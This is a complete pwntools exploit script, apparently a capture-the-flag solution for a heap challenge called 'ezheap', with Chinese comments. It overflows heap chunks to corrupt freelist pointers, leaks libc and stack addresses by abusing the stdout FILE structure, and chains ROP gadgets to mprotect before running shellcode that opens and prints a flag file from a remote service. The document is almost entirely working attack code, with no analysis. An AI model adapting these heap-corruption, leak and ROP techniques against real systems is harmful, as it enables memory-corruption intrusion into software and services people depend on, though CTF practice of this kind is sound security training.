#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')

elf = context.binary = ELF('./ezheap')
libc = elf.libc

local = 0
elf = ELF('./ezheap')
if local:
    io = process('./ezheap')
    libc = ELF("./libc.so")
else:
    io = remote('192.168.250.250',12340)
    libc = ELF('./libc.so')

sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4,b'\x00'))
uu64    = lambda data            : u64(data.ljust(8,b'\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def b():
    gdb.attach(io)
    pause()

def p():
    pause()

def c(idx):
    sla("Command: ",idx)

def malloc(size,data):
    c(1)
    sla("Size: ",size)
    sla("Content: ",data)

def fill(idx,size,data):
    c(2)
    sla("Index: ",idx)
    sla("Size: ",size)
    sla("Content: ",data)

def show(idx):
    c(4)
    sla("Index: ",idx)

def free(idx):
    c(3)
    sla("Index: ",idx)

malloc(0x18, '')
malloc(0x18, '')
malloc(0x18, '')
malloc(0x88, '')
malloc(0x88, '')
malloc(0x88, '')
malloc(0xa8, '')
malloc(0xa8, '')
malloc(0xa8, '')
malloc(0xc8, '')
malloc(0xc8, '')
malloc(0xc8, '')
fill(0, 0xffffffff,( b'\0' * 0x30 + p64(0x41) + p64(0x61) + b'\0' * 0x30 + p64(0x41) + p64(0x41) + b'\0' * 0x10 + p64(0x61) + p64(0x61)).decode("iso-8859-1") )#构造chunk0
free(1)
malloc(0x48, '')#chunk1的size已经变成0x60了，free掉chunk1 ,再malloc回来
fill(0, 0xffffffff,( b'\0' * 0x30 + p64(0x41) + p64(0x61) + b'\0' * 0x30 + p64(0x41) + p64(0x41) + b'\0' * 0x10 + p64(0x61) + p64(0x61)).decode("iso-8859-1") )#再次将破环的chunk0构造
free(2)#chunk2的fd和bk就泄漏出 控制结构的地址了

#泄漏地址
show(1)
ru(": ")
io.recvn(0x40)
libc_address = u64(io.recv(8)[0:6].ljust(8,b"\x00")) - 0x0b0a58+0x4c00
stdout = libc_address + 0xab3e0#0x49632 #0xb0280
lg("libc",libc_address)
lg("stdout_file",stdout)

#offbyone溢出修改chunk2.fd指针
fill(0, 0xffffffff, (b'\0' * 0x30 + p64(0x41) + p64(0x61) + b'\0' * 0x30 + p64(0x41) + p64(0x41) + p64(stdout - 0x30 - 0x100)[:6]).decode("iso-8859-1"))
malloc(0x18, '') #利用unsortedbin attack修改chain的地址

#offbyone溢出修改chunk4.fd指针
#利用unsortedbin attack修改chain+8的地址
free(4)
fill(3, 0xffffffff, (b'\0' * 0x90 + p64(0xa1) + p64(0xa1) + p64(stdout - 0x28 - 0x100)[:6]).decode("iso-8859-1"))
malloc(0x88, '') # 4


__stdio_write = 0
__stdio_write = libc_address + 0x49551#0x5adf0 # remote
lg("stdio_write",__stdio_write)
ibc_buf = 0
libc_buf = libc_address + 0xabd60#0xb1908 # remote
lg("libc_buf",libc_buf)

malloc(0x88, '') # 12 , memory of stdout

fill(12, 0xffffffff, (b'\0' * 0x118 + p64(0x45) + p64(0) * 3 + p64(libc_address + libc.sym['environ'] + 8) * 2 + p64(0) + p64(libc_address + libc.sym['environ']) + p64(0) + p64(__stdio_write) + p64(0) + p64(libc_buf) + p64(128)).decode("iso-8859-1"))

tmpstack = u64(io.recvn(8))
stack_addr = tmpstack - 0xd4a98#0x20198#0xd4a98 # localhost
one = tmpstack - 0x48
lg("tmpstack",tmpstack)
lg("stack_addr: ",stack_addr)



#b()
sl('2')
sl('12')
sl(str(0xffffffff))
sl( (b'\0' * 0x118 + p64(0x45) + p64(0) * 3 + p64(libc_address + libc.sym['environ'] + 8) * 2 + p64(0) + p64(libc_address + libc.sym['environ']) + p64(0) + p64(__stdio_write) + p64(0) + p64(libc_buf) + p64(0)).decode("iso-8859-1"))
pause()

free(7)
pause()

catflag = one - 0x20

fill(6, 0xffffffff,(b'\0' * 0xb0 + p64(0xc1) + p64(0xc1) + p64(catflag)[:6]).decode("iso-8859-1")) #p64(stack_addr + 0xd4a60 - 0x30)[:6]
pause()
malloc(0xa8,'')
pause()

#b()
free(10)
pause()
fill(9, 0xffffffff, (b'\0' * 0xd0 + p64(0xe1) + p64(0xe1) + p64(catflag+8)[:6]).decode("iso-8859-1"))
pause()

malloc(0xc8,'') # 10
pause()
#0x000000000001728d 0x000000000001879f 0x0000000000017957 0x00000000000172b3 0x0000000000034e0b  0x000000000002210e 0x00000000000172b3  0x000000000001e0fb
layout = [
    libc_address +0x000000000001728d, #0x0000000000015291, # pop rdi; ret
    (stack_addr + 0xd4a60 - 0x28) & (~0xfff),
    libc_address + 0x000000000001879f,#0x000000000001d829, # pop rsi; ret
    0x2000,
    libc_address + 0x0000000000017957,#0x000000000002cdda, # pop rdx; ret
    7,
    libc_address + 0x00000000000172b3,#0x0000000000016a16, # pop rax; ret
    21,
    libc_address + 0x0000000000034e0b,#0x0000000000078beb, # dec rax; shr rax, 1; movq xmm1, rax; andpd xmm0, xmm1; ret; 
    libc_address + 0x000000000002210e,#0x0000000000023720, # syscall; ret
    libc_address + 0x00000000000172b3,#0x0000000000016a16, # pop rax; ret
    stack_addr + 0xd4ab0,
    libc_address + 0x000000000001e0fb#0x0000000000019f2a, # call rax
]
shellcode = asm('''
    mov rax, 0x67616c66 ;// flag
    push 0
    push rax
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall

    cmp eax, 0
    js fail

    mov edi, eax
    mov rsi, rsp
    add rsi, 0x200
    push rsi
    mov edx, 100
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov eax, 1
    pop rsi
    mov edi, eax
    syscall ;// write

    jmp exit

    fail:
    mov rax, 0x727265206e65706f ;// open error!
    mov [rsp], rax
    mov eax, 0x0a21726f
    mov [rsp+8], rax
    mov rsi, rsp
    mov edi, 1
    mov edx, 12
    mov eax, edi
    syscall ;// write


    exit:
    xor edi, edi
    mov eax, 231
    syscall 
''')
malloc(0xc8, (flat(layout) + shellcode).decode("iso-8859-1")) # 13
pause()
sla('Command: ', '5')
pause()
io.recv()

io.interactive()
